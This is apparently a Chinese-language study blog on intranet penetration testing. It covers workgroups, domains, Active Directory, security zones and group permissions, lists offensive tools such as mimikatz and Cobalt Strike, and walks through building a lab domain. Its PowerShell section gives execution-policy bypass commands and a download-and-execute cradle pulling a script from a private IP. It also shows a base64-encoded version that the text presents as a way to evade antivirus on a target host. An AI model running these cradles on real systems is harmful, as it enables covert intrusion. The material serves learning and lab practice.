研究内网安全我们首先需要弄明白内网是什么？在渗透测试过程中我们一般把因特网称为外网，而将其余的网络（政务网、公安网、企业内网等）定义为内网。后来我仔细思考了一下，内外网的概念其实是相对而言的，比如一台电脑同处于办公室内的小型局域网和公司的大型局域网内，那么就可以把办公室内的局域网称为内网，公司的大型局域网称为外网。而通常情况下我们会同处于公司网和因特网之内，那么就会常常把因特网称为外网，公司网称为内网，久而久之这种概念也就形成了。内网相对于外网来说通信更快、传输文件更方便、共享更便利，但是相对来说安全性也更低，需要注意的点也有许多。本章主要讲解内网工作组、域、活动目录、域内权限解读等，同时包含内网渗透域环境、渗透测试环境的搭建方法以及常用的渗透测试工具。

## 0x01 内网基础知识

在内网中会出现许多名词和概念，如工作组、域、活动目录、安全域、域权限等，本节将从这些点展开扩展。

### （一）工作组

工作组简单理解就是根据工作特性不同而划分的计算机组。在一个局域网中，不同的计算机可以按照功能或部门的不同列入不同的工作组，例如销售部的计算机列入“销售部”工作组。财务部的计算机列入”财务部“工作组，技术部的计算机列入”技术部“工作组，这样下来当想要访问某个部门的资源时，只要在”网络“中单击部门的工作组名就可以找到看到其下的所有的计算机，从而提升了网络中的管理层次。

那么该如何加入工作组呢？其实也非常简单。  
1、单击”开始“找到”计算机“，右键选择”属性“或者直接进入”控制面板\系统和安全\系统“

![image](https://image.3001.net/images/20210816/1629045502_611942fe5c15925f0c002.png!small)

2、选择”更改设置“，点击”更改”，即可看到本机的工作组名，默认情况下就是“WORKGROUP”工作组  
![image](https://image.3001.net/images/20210816/1629045520_61194310e84036d90e83e.png!small)

可以修改工作组名来加入不同的工作组，如果工作组名在网络中不存在，那么就相当于新建了一个工作组。在网络中工作组是可以自由进入和退出的，其中的所有计算机计算机都是平等的，同时工作组没有集中管理功能。

### （二）域

域是一个有安全边界的计算机集合，域通过安全边界来隔离本域和外部资源。用户如果想要访问域内资源则需要以合法的权限登录域。而登陆域则需要经过“域内保安”-域控制器（Domain
Controller,DC）的审核，域控制器负责对连入的计算机和用户的验证工作，它本身存有整个域中关键信息（包括账号、密码、计算机名等）的数据库，其中身份验证主要经过以下几个步骤：

1、该计算机是否属于本域  
2、登录账号是否存在  
3、密码是否正确

在通过域控的身份认证后才能访问本域资源，进入域后则需要知道自己处于哪个域环境中

>
> 1、单域：一般情况下至少存在两台域服务器，分别为DC和备份DC。活动目录的数据库是存储于DC中的，备份DC的作用是当主域瘫痪时可以替代主域控直至恢复瘫痪的DC  
> 2、父域和子域：出于管理等需求在网络中划分多个域，而第一个域被称为父域，各分部的域被称为子域。例如父域为mac.com，那么子域就为*.mac.com  
>
> 3、域树：域树是多个域通过建立信任关系组成的集合。建立信任关系的两个域可以互相访问。而域树内的父域和子域不仅可以按需相互管理，还可以跨网络分配文件等资源，在一个域树中，父域可以拥有多个子域，子域也只能以父域的名字作为后缀名  
>
> 4、域森林：域森林是指多个域树建立信任关系组成的集合，例如某公司有域树mac.com，原来就有自己的域树mac.top，而mac.com无法挂在mac.top域树下，所以需要通过建立信任关系来构成域森林。通过域树之间的信任关系，可以管理和使用整个域森林中的资源。  
> 5、域名服务器：一般来说域控制器就是DNS服务器，用于实现域名和IP地址的转换。

### （三）活动目录

活动目录（Active
Directory,AD）是指域环境中提供目录服务的组件，目录是用于存储有关网络对象的信息，目录服务是指帮助用户快速、准备地从目录中找到其所需要的信息，而活动目录实现了目录服务，为企业提供了网络环境好中的集中式管理机制。  
在活动目录中存在逻辑架构，包括组织单元（OU）、域、域树、域森林。同一域树的所有域共享一个活动目录，其中的数据分散存储在各个域中，且每个域只存储该域的数据。比如我有一个名为M的集团，下面存在A、B、C三个子公司，子公司下包含各个部门，那么就可以以M集团（域森林）>子公司（域树）>部门（域）>员工（域用户）为结构。活动目录的这种层次结构使企业网络具有极强的可扩展性，便于住址、管理以及目录定位。

#### 活动目录与域控制器的区别

由域网络中的众多对象组成的层次结构的数据库被称为活动目录数据库（AD库）。要实现域环境其实就是要安装AD，如果内网中某台机器安装了AD，那么他就是DC。也就实现了只需要在活动目录中对某个账号修改一次密码，在整个域中任意一台机器上都可使用该账号登录。

### （四）安全域

划分安全域是将一组安全等级相同的计算机划入同一网段，其中的计算机拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的访问控制策略（NACL），从而提升内网安全防护等级。设计安全域是一个复杂的过程，首先需要考虑业务功能，在增加防护设备或配置安全策略后系统与应用的逻辑关联性是否会受影响以及业务系统的对外连接是否会受影响。其次需要考虑安全特性，也就是说设计安全域时是否能满足安全的基本要求（机密性、可用性、完整性），在这一前提下思考能否抵御来自不同威胁来源、不同威胁方式的攻击以及自身系统能承受何种强度的攻击。然后根据系统中扮演角色的重要性对资产进行划分，参照当前网络结构制定合理的资产分布图，构成相对安全的安全域。

从安全域的设计思路上看，安全防护其实也就这么回事，可以举一个例子来巩固一下安全理念：假设把家作为一个内网，而把家以外的世界看做是外网。家里的大门就是验证身份的第一道防线，我们可以通过指纹、钥匙、人脸的识别来解锁大门，那么信任关系就初步形成，家的信任程度高于家以外的世界。进入家门后，里面分布了厨房、客厅、厕所、卧室，组成了不同的功能区，这些地方的重要程度当然也不一样，客厅、厨房这些往往是不上锁的，而相对私密的卧室都有门来进行隔离，形成了第二道防线，那么也就说明说卧室的信任程度高于家。而家里的房产证、钱票又是重中之重，会被放置在高信任区，也就是卧室当中。为了安全，家里会买个保险柜来存放这些高价值的物品。从而形成了第三道防线，说明保险柜的信任程度高于卧室。通过以上例子，可以发现其中的信任程度由高到低可分为：保险柜
> 卧室 > 家 >
外部世界。而我们设计安全域结构也可以作为参考，将网络分为三个域：内网、DMZ区、外网，如果需要提高安全性的话我们还可以在这些域中放置监控、狗（安全设备）来保护我们的家（内网），而一个典型的安全域如下图所示。  
![image](https://image.3001.net/images/20210816/1629045543_611943271ca97e4ebe207.png!small)

DMZ区是为了解决安装防火墙后外部网络不能访问内部服务器而设立的一个非安全系统和安全系统之间的缓冲区。其中部署了公开的业务系统（Web服务器、邮件服务器等）和安全防护设备（IDS、防病毒、WAF等），达到防护内网又满足需求的效果。

### （五）域权限

在域内由于账号太多，管理员在为其分配权限时会浪费许多时间，便有了安全组的概念，它将处于同一权限的账户放置在同一组中，而管理员只需要设置组的访问权限就可以管理组内的一大批账户，可以大大简化网络维护和管理工作。接下来就简单介绍下域本地组、全局组、通用组的概念和区别。

> 1、域本地组  
> 多域用户访问单域资源（访问同一域），不能嵌套在其他组中，只能在其所在域内指派权限。  
> 2、全局组  
> 单域用户访问多域资源（必须是一个域里面的用户），能嵌套在其他组中，可在林中的任何域指派权限。  
> 3、通用组  
> 多域用户访问多域资源，能嵌套在其他组中，可在该域树或该林中的任何域中指派权限。

#### A-G-DL-P策略

A：Account，用户账号

G：Global Group，全局组

U：Universal Group，通用组

DL：Domain Local Group，域本地组

P：Permission，许可

A-G-DL-P策略是将用户策略添加到全局组中，将全局组添加到域本地组中，然后会域本地组分配资源权限。通过该策略对用户进行组织和管理是非常容易的，当需要给某一个用户添加到某个权限时，只要把这个用户添加到某个域本地组就可以了。比如存在两个域，分别为A域和B域，A域内有个A用户，B域内有个B用户，这两个用户都需要访问B域内的某个文件夹C，可以先在A、B两个域内各建一个全局组，然后在B域中建立一个域本地组，将这两个全局组都加入到这个域本地组中，再将C文件夹的访问权限赋予给这个域本地组。那么这个两个用户也就都能访问到B域内的C文件夹了，且A域管理员可以管理A用户，B域管理员可以管理B用户。如果不使用该策略，当A域的访问用户发生变化时，A域管理员会通知B域管理员，而由B域管理员更改域本地组的成员。既浪费了时间又增加了管理难度。

在创建域控制器时，会自动生成一些内置组。在域中"Builtin"和“Users”组织单元中的组就是内置组，如下图所示。  
![image](https://image.3001.net/images/20210816/1629045562_6119433add0aae8a78b82.png!small)![image](https://image.3001.net/images/20210816/1629045571_611943430683b4dbe6b4e.png!small)

## 0x02主机平台和常用工具

常用的操作系统有Windows、Linux、MacOS，具体使用那个操作系统并没有什么区别，主要看平时的使用习惯。重要的不是选择操作系统，而是掌握渗透测试思路和方法。

### （一）虚拟机的安装

平时无论是搭建环境也好，还是测试工具也罢。虚拟机都在其中扮演一个很重要的角色。因为我本身使用的MacOS系统，常用的虚拟机软件为Vmware和Parallels
Desktop，当然个人有个人的喜好，也有人喜欢使用Virtual Box，我更偏爱Vmware作为虚拟机使用软件，而Parallels
Desktop现在主要用于适配Mac的M1芯片，也常常在我的Mac
mini上使用测试。在进行测试时需要配置网络环境，虚拟机中搭配了三种适配器模式，分别为桥接模式、NAT模式以及仅主机模式。  
1、桥接模式：该模式下虚拟机同物理机处于同一局域网内。  
2、NAT模式：该模式下虚拟机通过NAT协议完成网络地址转换，即虚拟机通过物理机的连接来访问网络。  
3、仅主机模式：该模式下虚拟机会处于一个独立的网段中，但无法上网。

### （二）常用工具

1、WCE  
WCE（Windows 凭据管理器）是安全人员广泛使用的一种安全工具，常用于列出登录会话以及添加、修改、和删除关联凭据（如LM hash、NTLM
hash、明文密码和Kerberos票据）。  
2、mimikatz  
mimikatz主要用于从内存中获取明文密码、现金票据和密钥等。  
3、Responder  
Responder可以嗅探网络中的所有LLMNR包和获取各主机的信息。  
4、BeEF  
BeEF利用XSS通过Java Script对目标浏览器进行测试，同时可以配合MSF进行进一步渗透。  
5、DSHashes  
DSHashes主要从NTDSXtract中提取用户易于理解的散列值。  
6、PowerSploit  
PowerSploit是基于PowerShell的测试框架，主要用于信息收集、权限提升以及权限维持。  
7、Nishang  
Nishang也是一款基于PowerShell的测试工具，集成各类payload用于渗透测试。  
8、Empire  
类似于MSF，也是一款拥有丰富模块和接口的渗透测试工具。  
9、ps_encoder.py  
ps_encoder.py是使用base64封装的powershell命令包，目的是混淆和压缩代码。  
10、smbexec  
smbexec是使用Samba工具的快速PsExec类工具，它通过ipc$进行连接，将psexec.exe释放到目标主机中，铜鼓欧服务管理（SCManager）进程创建psexecsvc服务并启动服务并能直接提供目标主机的system权限。  
11、后门制造工厂  
后门制造共产可以对PE、ELF、Mach-O等二进制文件注入shellcode。  
12、Veil  
Veil用于生成绕过常见防病毒解决方案的MSF有效载荷。  
13、MSF  
世界上最常用的渗透测试框架。  
14、Cobalt Strike  
Cobalt Strike主要用于内网渗透，并提供团队协作功能。  
15、Nmap  
Nmap主要用于发现主机、扫描端口、识别服务和操作系统等  
16、Wireshark  
Wireshark主要用于网络协议和数据包分析，可以通过网络接口对整个网络接口进行监听。  
17、Putty  
Putty在windows下主要作为连接SSH 以及 Telnet 的客户端。  
18、sqlmap  
sqlmap主要用于检测和利用SQL注入漏洞。  
19、Burp Suite  
Burp Suite主要用于对web应用程序进行测试，最重要的几个模块为Intruder、Proxy、Repeater，用于抓包分析、参数爆破以及重放攻击。  
20、Hydra  
Hydra（九头蛇）主要用于登录爆破。  
21、Getif  
Getif主要用于收集SNMP设备的信息。  
22、Cain&Abel  
Cain&Abel是windows中的一个密码恢复工具，可以通过嗅探网络，来破解加密密码、记录VoIP会话、恢复无线网络密钥、显示面膜框、发现缓存中的密码、分析路由信息、并能恢复各种密码。

### （三）PowerShell基础

#### （1）优点

PowerShell是一种命令行外壳程序和脚本环境，win7的操作系统自带该环境。后缀名为ps1。它在windows下拥有一些得天独厚的优点。

脚本可以直接在内存中执行，不需要写入磁盘

几乎不会触发杀毒软件

可以远程执行

目前许多工具基于PowerShell开发

使用windows脚本更加容易

cmd.exe通常会被组织，但PowerShell运行通常不会被阻止

可用于管理活动目录

#### （2）执行策略

PowerShell其下提供执行策略，默认设置为Restricted，即脚本不可行执行。主要分为以下几种策略：

Restricted：脚本不能运行

Unrestricted：允许所有脚本运行

RemoteSigned：在本地创建的脚本可以运行，从网上下载的脚本不能运行。（拥有数字签名的除外）

AllSigned：仅当脚本由受信任的发布者签名时才能运行

可以在PowerShell中执行命令来查看和设置执行策略，如果需要执行Powershell脚本程序，需要使用管理员权限将Restricted改为Unrestricted。

    
    
    Get-ExecutionPolicy 
    Set-ExecutionPolicy Unrestricted
    

![image](https://image.3001.net/images/20210816/1629045591_6119435713457fea477f0.png!small)

#### （3）运行脚本

运行脚本可直接通过绝对路径来执行，如需执行C盘下的Script目录下a.ps1脚本，则输入以下命令：

    
    
    C:\Script\a.ps1
    

或者进入C盘Script目录下，通过相对路径来执行以下命令：

    
    
    cd C:\Script
    .\a.ps1
    

![image](https://image.3001.net/images/20210816/1629045603_61194363a0305b1265dc3.png!small)  
也可以使用管道符来执行命令，主要将一个命令的输出作为另一个命令的输入，输入以下命令后直接退出powershell。

    
    
    Get-Process p* | stop-process
    

#### （4）基本知识

新建目录：New-Item test -ItemType Directory  
新建文件：New-Item test.txt -ItemType File  
删除目录：Remove-Item test  
设置文本内容：Set-Content test.txt -Value "Hello world"  
显示文本内容：Get-Content test.txt  
追加内容：Add-Content test.txt -Value "Hello mac"  
清除内容：Clear-Content test.txt  
![image](https://image.3001.net/images/20210816/1629045617_6119437135abc04d958cd.png!small)![image](https://image.3001.net/images/20210816/1629045627_6119437b3d33e5494522e.png!small)![image](https://image.3001.net/images/20210816/1629045634_61194382ba2d8f2a33087.png!small)![image](https://image.3001.net/images/20210816/1629045641_61194389e786dc7f9b586.png!small)

#### （5）常用命令

参数说明：

ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略

Windows Hidden（-W Hidden）：隐藏窗口

NonInteractive（-NonI）：非交互模式

NoProfile（-NoP）：Powershell不加载当前用户的配置文件

noexit：执行后不退出shell

NoLogo：启动不显示版权标志的Powershell

1、将脚本绕过本地权限并执行PowerShell命令。

    
    
    powershell.exe -ExecutionPolicy Bypass -File .\test1.ps1
    powershell.exe -exec bypass -Command "& {Import-Module C:\Script\PowerUp.ps1;Invoke-AllChecks}"
    

![image](https://image.3001.net/images/20210816/1629045654_61194396c1d406c963095.png!small)![image](https://image.3001.net/images/20210816/1629045662_6119439e034d4f7cd464e.png!small)

2、从网站服务器下载并绕过本地权限执行

    
    
    powershell.exe -Exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://172.16.54.1/1.ps1')"
    

![image](https://image.3001.net/images/20210816/1629045673_611943a9956797b5db89c.png!small)

3、使用Base64对Powershell命令进行编码  
Base64编码可以对Powershell命令进行编码，主要用于混淆、压缩代码，从而达到绕过杀软的目的。

    
    
    echo "IEX (New-Object Net.WebClient).DownloadString('http://172.16.54.1/1.ps1')" > test.txt
    python2 ps_encoder.py -s test.txt
    

![image](https://image.3001.net/images/20210816/1629045684_611943b4eb9008a56a5e1.png!small)  
最后在目标主机上执行如下命令：

    
    
    powershell.exe -Exec Bypass -noexit -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA1ADQALgAxAC8AMQAuAHAAcwAxACcAKQAKAA==
    

![image](https://image.3001.net/images/20210816/1629045696_611943c058bece46aa49f.png!small)

>
> 注：Windows中的Powershell版本分为64位和32位，其中这两个版本的执行策略不会相互影响，可以看为两个独立的程序。其中64位的配置文件在"%windir%\syswow64\WindowsPowerShell\v1.0"目录下。

## 0x03 构建内网环境

内网渗透测试，很大程度上就是域渗透测试。网络安全法的出台导致渗透一个实际的公司域环境显得有点不那么现实，但是我们可以在本地搭建一个域环境来模拟渗透。在一个域环境中主要存在以下几个角色：

> 1、域控制器  
> 2、成员服务器  
> 3、客户机  
> 4、独立服务器

本次搭建环境只包括父域控+子域控+客户机，感兴趣的可以自行架设其他相关角色，同时在使用vmware进行域环境搭建时需注意以下几个问题。

 **注意点1: 主域服务器需选择win2012及以上版本**  
 **注意点2: 如果是链接克隆需要更改sid，需运行 >sysprep否则会导致子域无法建立**  
 **注意点3：所有操作系统都需安装vmeware tools，当安装vmware
tools时图标出现灰色，需要将CD/DVD和软盘设置为自动检测，其中win2012需要安装KB2919355才能安装**

> 小技巧：如需设置桌面，可以通过win+R运行输入
    
    
    rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0
    

### （一）主域搭建

（1）设置具有复杂度的管理员密码并配置静态IP，将左边的配置写入右边  
![image](https://image.3001.net/images/20210816/1629045713_611943d1d724e20b52c4a.png!small)

（2）添加角色和功能  
![image](https://image.3001.net/images/20210816/1629045723_611943dbc8218be16ec4b.png!small)

（3）勾选域服务，需要安装.net环境  
![image](https://image.3001.net/images/20210816/1629045736_611943e8966ca254daa6a.png!small)

（4）升级服务器为域控制器  
![image](https://image.3001.net/images/20210816/1629045749_611943f5a3682ff01d8eb.png!small)

（5）添加新林，取根域名为maccc1.com  
![image](https://image.3001.net/images/20210816/1629045763_611944039fb4afbe2b32a.png!small)

（6）域控制器选项

选择林功能、域功能为为Windows Server 2016

指定域控制器选项域名服务器、全局编录

输入还原模式密码（有密码复杂度要求）

![image](https://image.3001.net/images/20210816/1629045775_6119440f63bfd7fc52624.png!small)

（7）之后都下一步先觉条件检查通过后安装  
![image](https://image.3001.net/images/20210816/1629045792_611944208fed21814b183.png!small)  
（8）安装成功后会重启服务器，出现错误  
![image](https://image.3001.net/images/20210816/1629045803_6119442bd02e41b2177f9.png!small)

（9）打开本地安全策略进行修改，将“已禁用”修改为“已启用”  
![image](https://image.3001.net/images/20210816/1629045816_61194438a98ba6d042e93.png!small)

### （二）添加主域客户机

（1）更改DNS服务器为主域IP地址  
![image](https://image.3001.net/images/20210816/1629045830_61194446b05d818b0962c.png!small)

（2）更改计算机域，输入域管理员账户后重启即可  
![image](https://image.3001.net/images/20210816/1629045842_611944523c0de6801720e.png!small)

### （三）子域搭建

（1）安装域服务并配置静态IP  
![image](https://image.3001.net/images/20210816/1629045856_6119446031e4fbdad34e4.png!small)

（2）添加父域名和新域名，选择父域名之后选择，输入域管理员账号密码，用户名输入为域名\用户名，如maccc1.com\administrator  
![image](https://image.3001.net/images/20210816/1629045867_6119446b6ba32e8ca290a.png!small)

（3）更改域控制器选项  
![image](https://image.3001.net/images/20210816/1629045885_6119447d0727b985b05e8.png!small)

（4）创建DNS委派  
![image](https://image.3001.net/images/20210816/1629045899_6119448b1ce386d8e96c3.png!small)

（5）一直下一步，先决条件检查通过后安装  
![image](https://image.3001.net/images/20210816/1629045913_611944999384e81e57b40.png!small)

（6）但是会出错，原因是当完成链接克隆后sid与父域服务器相同  
![image](https://image.3001.net/images/20210816/1629045929_611944a953e6e9cb9e3f4.png!small)![image](https://image.3001.net/images/20210816/1629045941_611944b5e2b54011c62d6.png!small)

（7）win+R之后输入sysprep进行sid重置  
![image](https://image.3001.net/images/20210816/1629045954_611944c2251f19affe914.png!small)

（8）系统准备工具选择通用并重启，之后就加入子域了  
![image](https://image.3001.net/images/20210816/1629045967_611944cf3221237ffffd3.png!small)

## 0x04 总结

本文以《内网安全攻防 渗透测试实战指南》中的框架为主，描述了我在实际操作中出现的各类问题以及个人想法，欢迎各位大佬在评论区批评指正。

